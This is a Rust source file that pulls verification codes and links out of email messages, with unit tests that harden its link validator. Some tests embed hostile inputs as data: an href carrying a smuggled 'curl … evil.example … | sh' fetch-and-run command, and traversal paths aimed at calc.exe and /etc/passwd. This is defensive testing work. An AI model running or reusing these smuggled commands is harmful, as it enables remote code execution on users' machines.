//! Pulling verification codes and links out of a message.

use std::collections::HashSet;
use std::sync::LazyLock;

use regex::Regex;
use serde::Serialize;

#[derive(Debug, Clone, Serialize, PartialEq)]
pub struct Candidate {
    pub code: String,
    pub score: i32,
}

/// Words that usually sit next to a one-time code, in a few languages.
static KEYWORD: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(
        r"(?i)\b(code|codes|otp|pin|passcode|password|verification|verify|verifying|confirm|confirmation|security|one[- ]time|token|2fa|mfa|login|sign[- ]in|código|codigo|verificación|verificação|bestätigungscode|sicherheitscode|vérification|kod|код|验证码)\b|验证码|認証コード|인증",
    )
    .unwrap()
});

/// Numeric codes (optionally split as `123 456` / `123-456`) and mixed
/// upper-case alphanumeric codes such as `A7K2QX`.
static CODE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"\b(\d{3}[ -]\d{3}|\d{4,8}|[A-Z0-9]{5,8})\b").unwrap());

/// Returns candidates best-first. An empty list means nothing looked like a code.
pub fn otp_candidates(subject: &str, body: &str) -> Vec<Candidate> {
    let mut out: Vec<Candidate> = Vec::new();
    let mut at: std::collections::HashMap<String, usize> = std::collections::HashMap::new();
    for (text, bonus) in [(subject, 3), (body, 0)] {
        let text = head(text, MAX_SCAN);
        for m in CODE.find_iter(text) {
            let raw = m.as_str();
            let code: String = raw.chars().filter(|c| !matches!(c, ' ' | '-')).collect();
            let digits = code.chars().filter(char::is_ascii_digit).count();
            let letters = code.len() - digits;
            if digits == 0 {
                continue; // plain words in capitals
            }
            if letters > 0 && digits < 2 {
                continue; // things like "COVID1"
            }

            let mut score = bonus;
            let before = window_before(text, m.start(), 80);
            let after = window_after(text, m.end(), 30);

            if KEYWORD.is_match(before) {
                score += 10;
                // Closer keywords count more ("code: 123456").
                if KEYWORD.is_match(window_before(text, m.start(), 25)) {
                    score += 4;
                }
            } else if KEYWORD.is_match(after) {
                score += 6; // "123456 is your code"
            }
            if letters == 0 {
                score += match code.len() {
                    6 => 3,
                    4 | 5 | 7 | 8 => 1,
                    _ => 0,
                };
            } else {
                score -= 1;
            }
            if raw.contains([' ', '-']) {
                score -= 1;
            }
            // Things that look like years, prices, phone numbers, times, ids in URLs.
            if letters == 0 && code.len() == 4 && (code.starts_with("19") || code.starts_with("20"))
            {
                score -= 6;
            }
            let prev = before.chars().last().unwrap_or(' ');
            let next = after.chars().next().unwrap_or(' ');
            if matches!(
                prev,
                '$' | '€' | '£' | '+' | '#' | '/' | '=' | '.' | ',' | ':' | '&' | '?' | '%'
            ) && !before.trim_end().ends_with("code:")
                && !KEYWORD.is_match(window_before(text, m.start(), 25))
            {
                score -= 5;
            }
            if matches!(next, '%' | '/' | ',' | ':' | '@' | '=' | '&') {
                score -= 4;
            }
            if next == '.'
                && after
                    .chars()
                    .nth(1)
                    .is_some_and(|c| c.is_ascii_alphanumeric())
            {
                score -= 4; // part of a domain or version number
            }

            match at.get(&code) {
                Some(&i) => out[i].score = out[i].score.max(score) + 1,
                None => {
                    at.insert(code.clone(), out.len());
                    out.push(Candidate { code, score });
                }
            }
        }
    }
    out.retain(|c| c.score > 0);
    out.sort_by_key(|c| std::cmp::Reverse(c.score));
    out
}

/// The most likely verification code, if any. `custom` overrides the
/// heuristics: its first capture group (or whole match) is returned.
pub fn otp(subject: &str, body: &str, custom: Option<&Regex>) -> Option<String> {
    if let Some(re) = custom {
        for text in [subject, body] {
            if let Some(c) = re.captures(text) {
                return c
                    .get(1)
                    .or_else(|| c.get(0))
                    .map(|m| m.as_str().to_string());
            }
        }
        return None;
    }
    otp_candidates(subject, body)
        .into_iter()
        .next()
        .map(|c| c.code)
}

/// How much of a text is searched for codes and links: far more than any
/// real mail's text, so a sender's megabytes of filler cost no more.
const MAX_SCAN: usize = 1 << 20;

/// The first `max` bytes of `text`, cut at a space before that (so no link
/// or code is cut in two), or on a character boundary if there is none
/// near.
fn head(text: &str, max: usize) -> &str {
    if text.len() <= max {
        return text;
    }
    let mut cut = max;
    while !text.is_char_boundary(cut) {
        cut -= 1;
    }
    let near = window_before(text, cut, 4096);
    let end = near
        .rfind(|c: char| c.is_whitespace() || c == '<')
        .map_or(cut, |i| cut - near.len() + i);
    &text[..end]
}

fn window_before(text: &str, end: usize, len: usize) -> &str {
    let mut start = end.saturating_sub(len);
    while !text.is_char_boundary(start) {
        start -= 1;
    }
    &text[start..end]
}

fn window_after(text: &str, start: usize, len: usize) -> &str {
    let mut end = (start + len).min(text.len());
    while !text.is_char_boundary(end) {
        end += 1;
    }
    &text[start..end]
}

/// A URL in text runs to a space, a bracket or quote, or an invisible
/// character (a left-to-right mark after a link in right-to-left mail ends
/// it, as it does for a reader).
static URL: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r#"(?i)\bhttps?://[^\s<>"'()\[\]{}\p{Cc}\p{Cf}]+"#).unwrap());
static HREF: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r#"(?i)href\s*=\s*["']([^"']+)["']"#).unwrap());
/// What HTML loads rather than links to: `src`, `background`, `poster`,
/// `srcset` (group 2) and CSS `url(...)`.
static LOADED: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(
        r#"(?is)\s(?:src|background|poster|lowsrc|dynsrc)\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s>"']+))|\ssrcset\s*=\s*(?:"([^"]*)"|'([^']*)')|url\(\s*(?:"([^"]*)"|'([^']*)'|([^)"'\s]+))"#,
    )
    .unwrap()
});
static ACTION_WORDS: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?i)verif|confirm|activat|validat|magic|login|log-in|signin|sign-in|sign_in|auth|token|reset|password|invite|accept|register|onboard|otp|code").unwrap()
});
static NOISE_WORDS: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?i)unsubscribe|preferences|privacy|terms|help|support|facebook\.com|twitter\.com|x\.com/|linkedin\.com|instagram\.com|youtube\.com|\.(png|jpe?g|gif|svg|webp|css|ico)(\?|$)").unwrap()
});

/// All http(s) links in the text and HTML bodies, deduplicated, with likely
/// action links (verify, confirm, magic login, reset...) first. An address
/// the HTML only loads (an image's `src`, `srcset` or `background`, a CSS
/// `url(...)`) isn't a link a reader would open: it is left out, also when
/// the text body repeats it, unless something links to it (`href`).
pub fn links(text: &str, html: &str) -> Vec<String> {
    let (text, html) = (head(text, MAX_SCAN), head(html, 4 * MAX_SCAN));
    let mut found: Vec<String> = Vec::new();
    let mut seen: HashSet<String> = HashSet::new();
    // Where the hrefs are: the scan of the HTML for bare URLs skips them,
    // so an href refused as a whole doesn't come back cut short.
    let mut hrefs = Vec::new();
    for c in HREF.captures_iter(html) {
        let value = c.get(1).expect("group 1");
        hrefs.push(value.range());
        if let Some(url) = link_url(value.as_str())
            && seen.insert(url.clone())
        {
            found.push(url);
        }
    }
    let mut loaded = HashSet::new();
    for c in LOADED.captures_iter(html) {
        let srcset = c.get(4).or(c.get(5));
        let value = (1..=8).find_map(|i| c.get(i)).map_or("", |m| m.as_str());
        let urls: Vec<&str> = match srcset {
            Some(set) => srcset_urls(set.as_str()),
            None => vec![value],
        };
        // Only compared with what is found, so not checked as a link.
        loaded.extend(urls.into_iter().map(normalized_url));
    }
    loaded.retain(|u| !seen.contains(u));
    // The hrefs come in order and don't overlap: a binary search finds the
    // one an offset could be in.
    let in_href = |at: usize| {
        let i = hrefs.partition_point(|r| r.start <= at);
        i > 0 && hrefs[i - 1].contains(&at)
    };
    let bare = URL
        .find_iter(html)
        .filter(|m| !in_href(m.start()))
        .chain(URL.find_iter(text));
    for m in bare {
        if let Some(url) = link_url(m.as_str()).filter(|u| !loaded.contains(u))
            && seen.insert(url.clone())
        {
            found.push(url);
        }
    }
    let rank = |u: &str| -> i32 {
        let mut s = 0;
        if ACTION_WORDS.is_match(u) {
            s += 2;
        }
        if NOISE_WORDS.is_match(u) {
            s -= 3;
        }
        s
    };
    // Stable sort keeps document order within the same rank.
    found.sort_by_key(|u| -rank(u));
    found
}

/// The addresses of a `srcset` (`URL 1x, URL 2x`): each candidate's
/// address runs to a space, and may have commas in it; a comma at its end,
/// or after its descriptors, starts the next candidate.
fn srcset_urls(set: &str) -> Vec<&str> {
    let mut urls = Vec::new();
    let mut want_url = true;
    for token in set.split_whitespace() {
        if want_url {
            urls.push(token.trim_end_matches(','));
            want_url = token.ends_with(',');
        } else if token.ends_with(',') {
            want_url = true;
        }
    }
    urls
}

/// An http(s) URL as written in mail, without the punctuation around it,
/// if it is a real web link ([`is_web_link`]) once read as a browser reads
/// an href ([`normalized_url`]).
fn link_url(raw: &str) -> Option<String> {
    let url = normalized_url(raw);
    is_web_link(&url).then_some(url)
}

/// `raw` as a browser reads an href: HTML character references decoded,
/// tabs and line breaks dropped, the ends trimmed (and the punctuation a
/// sentence puts after a link), and spaces, controls and invisible
/// characters inside percent-encoded.
fn normalized_url(raw: &str) -> String {
    let decoded = decode_entities(raw);
    let flat: String = decoded
        .chars()
        .filter(|c| !matches!(c, '\t' | '\n' | '\r'))
        .collect();
    let trimmed = flat
        .trim_matches(|c: char| c <= ' ' || c.is_whitespace())
        .trim_end_matches(['.', ',', ';', ':', '!', '?', '>']);
    let mut out = String::with_capacity(trimmed.len());
    for c in trimmed.chars() {
        if c.is_whitespace() || c.is_control() || is_invisible(c) {
            let mut buf = [0; 4];
            for b in c.encode_utf8(&mut buf).bytes() {
                out.push_str(&format!("%{b:02X}"));
            }
        } else {
            out.push(c);
        }
    }
    out
}

use crate::render::is_invisible;

/// Decodes HTML character references (`&amp;`, `&#38;`, `&#x26;`, and the
/// few named ones URLs use); anything else is left as written.
fn decode_entities(s: &str) -> String {
    if !s.contains('&') {
        return s.to_string();
    }
    let mut out = String::with_capacity(s.len());
    let mut rest = s;
    while let Some(i) = rest.find('&') {
        out.push_str(&rest[..i]);
        rest = &rest[i..];
        let end = rest[1..]
            .find(|c: char| !c.is_ascii_alphanumeric() && c != '#')
            .map_or(rest.len(), |e| e + 1);
        let name = &rest[1..end];
        let ch = match name {
            "amp" => Some('&'),
            "lt" => Some('<'),
            "gt" => Some('>'),
            "quot" => Some('"'),
            "apos" => Some('\''),
            "nbsp" => Some('\u{A0}'),
            _ => name
                .strip_prefix("#x")
                .or_else(|| name.strip_prefix("#X"))
                .map(|h| u32::from_str_radix(h, 16))
                .or_else(|| name.strip_prefix('#').map(str::parse::<u32>))
                .and_then(Result::ok)
                .and_then(char::from_u32),
        };
        match ch {
            Some(c) if !name.is_empty() => {
                out.push(c);
                rest = &rest[end..];
                rest = rest.strip_prefix(';').unwrap_or(rest);
            }
            _ => {
                out.push('&');
                rest = &rest[1..];
            }
        }
    }
    out.push_str(rest);
    out
}

/// Whether `s` is a link a browser may be given: an absolute `http://` or
/// `https://` URL (either case) that parses with a host, written without
/// whitespace, backslashes, control or invisible format characters. A
/// string that only starts with `http` (`http\..\setup.exe`,
/// `http/../file.html`) is a path an opener would resolve on disk, and a
/// newline in a link would run as a second command when pasted in a shell.
pub fn is_web_link(s: &str) -> bool {
    let rest = ["https://", "http://"].iter().find_map(|p| {
        s.get(..p.len())
            .filter(|head| head.eq_ignore_ascii_case(p))
            .map(|_| &s[p.len()..])
    });
    let Some(rest) = rest else {
        return false;
    };
    if rest.is_empty()
        || rest.starts_with('/')
        || s.chars()
            .any(|c| c.is_whitespace() || c.is_control() || c == '\\' || is_invisible(c))
    {
        return false;
    }
    reqwest::Url::parse(s).is_ok_and(|u| {
        matches!(u.scheme(), "http" | "https") && u.host_str().is_some_and(|h| !h.is_empty())
    })
}

/// Adds `url` to `list` unless it has it already (linear in the list; for
/// a long list, keep a `HashSet` beside it).
pub fn push_new(list: &mut Vec<String>, url: String) {
    if !list.contains(&url) {
        list.push(url);
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn best(subject: &str, body: &str) -> Option<String> {
        otp(subject, body, None)
    }

    #[test]
    fn finds_common_code_formats() {
        assert_eq!(
            best("Your verification code", "Use 482913 to sign in."),
            Some("482913".into())
        );
        assert_eq!(best("", "Your code is: 7731"), Some("7731".into()));
        assert_eq!(
            best("482913 is your Instagram code", ""),
            Some("482913".into())
        );
        assert_eq!(
            best("", "Enter the code 123-456 to continue"),
            Some("123456".into())
        );
        assert_eq!(
            best("", "Your one-time passcode: A7K2QX"),
            Some("A7K2QX".into())
        );
        assert_eq!(
            best("", "Votre code de vérification est 550123"),
            Some("550123".into())
        );
    }

    #[test]
    fn prefers_code_near_keyword_over_other_numbers() {
        let body = "Order #99812 placed on 2026-10-05 for $1499.\n\
                    Call +1 5551234 for help.\n\
                    Your security code is 318204. It expires in 10 minutes.";
        assert_eq!(best("Welcome to Acme 2026", body), Some("318204".into()));
    }

    #[test]
    fn ignores_years_prices_and_plain_words() {
        assert_eq!(
            best(
                "Newsletter 2026",
                "Prices from $1999. HELLO WORLD. Copyright 2025."
            ),
            None
        );
    }

    #[test]
    fn custom_regex_wins() {
        let re = Regex::new(r"PIN=(\d+)").unwrap();
        assert_eq!(otp("", "code 123456 PIN=42", Some(&re)), Some("42".into()));
        assert_eq!(otp("", "nothing", Some(&re)), None);
    }

    #[test]
    fn links_are_deduplicated_and_ranked() {
        let html = r#"<a href="https://example.com/unsubscribe">u</a>
            <img src="https://cdn.example.com/logo.png">
            <a href="https://example.com/verify?token=abc&amp;u=1">Verify</a>"#;
        let text = "Visit https://example.com/about. Or https://example.com/verify?token=abc&u=1";
        let l = links(text, html);
        assert_eq!(l[0], "https://example.com/verify?token=abc&u=1");
        assert_eq!(l.iter().filter(|u| u.contains("verify")).count(), 1);
        assert!(l.contains(&"https://example.com/about".to_string()));
        // An image isn't a link.
        assert!(!l.iter().any(|u| u.contains("logo.png")), "{l:?}");
    }

    #[test]
    fn only_real_web_links_are_links() {
        // Security review B1: strings that only start with `http` are paths
        // an opener resolves on disk; B6: a newline would paste as a command.
        let html = r#"<a href="http\..\..\Windows\System32\verify\..\calc.exe">Verify</a>
            <a href="http/../../../../home/u/Downloads/verify.html">Verify</a>
            <a href="httpfoo:verify">x</a> <a href="http:/verify.example/x">x</a>
            <a href="http:\\verify.example\x">x</a> <a href="https:///etc/verify">x</a>
            <a href="https://ok.example/verify?t=1&#10; curl -s https://evil.example/x | sh">x</a>
            <a href="https://ok.example/verify?t=2
curl https://evil.example/y">x</a>
            <a href="HTTPS://Shop.Example/news">news</a>"#;
        let l = links("http/../x/verify.html and http:verify", html);
        // What the text scan finds in the bad hrefs is cut at the space or
        // the newline so only whole web links are left.
        assert_eq!(
            l,
            [
                "https://ok.example/verify?t=1%20curl%20-s%20https://evil.example/x%20|%20sh",
                "https://ok.example/verify?t=2curl%20https://evil.example/y",
                "HTTPS://Shop.Example/news",
            ]
        );
        for bad in [
            "http\\..\\calc.exe",
            "http/../a.html",
            "http:/x.example",
            "http:\\\\x.example\\a",
            "https:///etc/passwd",
            "https://",
            "http://a b.example/",
            "https://x.example/a\nb",
            "https://x.example/\u{200B}",
            "https://x.example/\u{202E}a",
            "ftp://x.example/",
            "https://[oops/",
        ] {
            assert!(!is_web_link(bad), "{bad:?}");
        }
        for good in [
            "https://x.example",
            "http://x.example:8080/a?b=c#d",
            "HTTP://X.EXAMPLE/",
        ] {
            assert!(is_web_link(good), "{good:?}");
        }
    }

    #[test]
    fn links_are_read_as_a_browser_reads_them() {
        // A mark after a link in right-to-left text ends it; references
        // other than `&amp;` are decoded; a bidi override inside is escaped.
        let text = "\u{5D0} https://x.example/verify?t=1\u{200E} \u{5D1}";
        let html = "<a href=\"https://x.example/v?a=1&#38;token=abc&#x26;b=2\">v</a>\
                    <a href=\"https://x.example/r\u{202E}a\">r</a>\
                    <a href=\"https://x.example/n?name=Jo Doe&amp;t=9\">n</a>";
        assert_eq!(
            links(text, html),
            [
                "https://x.example/v?a=1&token=abc&b=2",
                "https://x.example/verify?t=1",
                "https://x.example/r%E2%80%AEa",
                "https://x.example/n?name=Jo%20Doe&t=9",
            ]
        );
        assert_eq!(decode_entities("a&b &#bad; &#x41;&gt"), "a&b &#bad; A>");
    }

    #[test]
    fn what_html_only_loads_is_not_a_link() {
        // A "remote images" mail: no `<a>` at all.
        let html = r#"<html><head><style>body{background:url(https://t.x/bg.png)}</style></head>
            <body background="https://t.x/body.jpg">
            <img src="https://www.google.com/images/branding/logo.png">
            <img src='http://neverssl.com/favicon.ico' srcset="https://i.x/a.png 1x, https://i.x/b,c.png 2x">
            <img src="https://res.cloudinary.com/d/upload/w_600,h_300/logo.png">
            <div style="background-image:url('https://t.x/div.gif')">Hi</div>
            <p>Read https://example.com/terms or <a href="https://example.com/verify?t=1&amp;u=2">verify</a>.</p>
            <a href="https://i.x/a.png">the picture itself</a>
            <!--[if mso]><v:roundrect href="https://x.example/verify-mso"></v:roundrect><![endif]-->
            <form action="https://x.example/confirm?t=1"><button>Confirm</button></form>
            <p>if a < b then visit https://x.example/sloppy ok > done</p></body></html>"#;
        let text = "Pictures: https://www.google.com/images/branding/logo.png\n\
            https://res.cloudinary.com/d/upload/w_600,h_300/logo.png\nhttps://example.com/plain";
        let l = links(text, html);
        for gone in ["t.x", "google.com", "neverssl", "b,c.png", "cloudinary"] {
            assert!(!l.iter().any(|u| u.contains(gone)), "{gone}: {l:?}");
        }
        // Links stay, wherever they are: an image that is also linked to,
        // an Outlook button, a form, text in sloppy HTML.
        for kept in [
            "https://example.com/verify?t=1&u=2",
            "https://i.x/a.png",
            "https://x.example/verify-mso",
            "https://x.example/confirm?t=1",
            "https://x.example/sloppy",
            "https://example.com/terms",
            "https://example.com/plain",
        ] {
            assert!(l.iter().any(|u| u == kept), "{kept}: {l:?}");
        }
        assert_eq!(l[0], "https://example.com/verify?t=1&u=2");
    }

    #[test]
    fn many_codes_and_links_stay_fast() {
        // Security review A3: 560 KB of distinct codes took 10 s, 1.4 MB of
        // distinct links 8 s (release builds); generous bounds for debug.
        let codes: String = (0..80_000)
            .map(|i| format!("{:06} ", 100_000 + i))
            .collect();
        let t = std::time::Instant::now();
        let _ = otp_candidates("", &codes);
        assert!(t.elapsed().as_secs() < 10, "otp {:?}", t.elapsed());
        let urls: String = (0..40_000)
            .map(|i| format!("https://x.example/{i} "))
            .collect();
        let html: String = (0..20_000)
            .map(|i| format!("<a href=\"https://y.example/{i}\">x</a>"))
            .collect();
        let t = std::time::Instant::now();
        let l = links(&urls, &html);
        assert!(t.elapsed().as_secs() < 10, "links {:?}", t.elapsed());
        assert!(l.len() > 50_000);
    }

    #[test]
    fn a_link_at_the_scan_limit_is_not_cut() {
        let filler = "x ".repeat((MAX_SCAN - 10) / 2);
        let text = format!("{filler}https://bank.example/reset?token=abcdef0123456789 end");
        assert!(
            links(&text, "").is_empty(),
            "past the limit: left out, not cut"
        );
        assert!(head("\u{e9}\u{e9}\u{e9}", 3).len() <= 3);
    }
}
